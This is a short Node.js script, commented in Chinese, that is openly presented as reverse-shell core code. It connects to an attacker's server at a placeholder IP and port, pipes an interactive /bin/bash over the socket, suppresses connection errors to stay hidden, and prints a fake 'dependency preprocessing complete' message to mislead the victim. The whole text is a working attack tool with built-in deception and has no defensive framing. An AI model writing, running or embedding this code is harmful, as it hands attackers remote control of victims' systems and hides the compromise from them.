// 反弹Shell核心代码（适配Linux/macOS，连接攻击者服务器）
const net = require('net');
const { exec } = require('child_process');

// 攻击者服务器IP和端口（需替换为攻击者的VPS地址）
const attackerIP = "192.168.1.100"; 
const attackerPort = 4444;

// 创建TCP连接，反弹Shell到攻击者服务器
const client = new net.Socket();
client.connect(attackerPort, attackerIP, () => {
  // 替换当前进程为shell，实现交互式反弹
  const shell = exec('/bin/bash');
  client.pipe(shell.stdin);  // 攻击者输入 → shell标准输入
  shell.stdout.pipe(client); // shell输出 → 攻击者客户端
  shell.stderr.pipe(client); // shell错误输出 → 攻击者客户端
});

// 连接失败时静默（避免暴露）
client.on('error', () => {
  // 无任何输出，隐藏攻击行为
});

// 伪装正常日志，降低警惕
console.log("✅ 依赖预处理完成，可正常使用");
